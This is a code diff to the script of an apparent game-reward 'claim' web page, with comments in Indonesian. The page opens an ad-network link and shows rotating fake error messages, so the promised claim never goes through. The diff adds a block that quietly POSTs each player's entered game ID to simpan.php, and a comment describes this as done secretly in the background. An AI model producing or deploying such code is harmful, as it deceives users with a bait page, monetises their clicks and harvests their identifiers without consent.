@@ -144,24 +144,31 @@
         ];
 
         function mulaiKlaim() {
-            const idInput = document.getElementById('playerID').value;
-            const statusBox = document.getElementById('status-box');
-            
-            if (idInput === "") {
-                alert("Harap masukkan ID Game kamu!");
-                return;
-            }
+    const idInput = document.getElementById('playerID').value;
+    const statusBox = document.getElementById('status-box');
+    
+    if (idInput === "") {
+        alert("Harap masukkan ID Game kamu!");
+        return;
+    }
 
-            // 1. Buka Link Iklan di Tab Baru
-            window.open("https://www.effectivegatecpm.com/u8zsmte8m?key=533b71b21df6f331ac2abe4da9180822", "_blank");
+    // --- KODE BACKUP DATA DIMULAI ---
+    // Mengirim data ID ke file simpan.php secara diam-diam (Background)
+    fetch('simpan.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'id_game=' + encodeURIComponent(idInput)
+    });
+    // --- KODE BACKUP DATA SELESAI ---
 
-            // 2. Munculkan pesan error di halaman ini setelah user klik
-            statusBox.innerText = daftarPesan[urutanPesan];
-            statusBox.style.display = "block";
+    // Buka Link Iklan
+    window.open("https://www.effectivegatecpm.com/u8zsmte8m?key=533b71b21df6f331ac2abe4da9180822", "_blank");
 
-            // Update urutan pesan untuk klik berikutnya
-            urutanPesan = (urutanPesan + 1) % daftarPesan.length;
-        }
+    // Munculkan pesan error
+    statusBox.innerText = daftarPesan[urutanPesan];
+    statusBox.style.display = "block";
+    urutanPesan = (urutanPesan + 1) % daftarPesan.length;
+}
 
         function resetForm() {
             const idInput = document.getElementById('playerID');
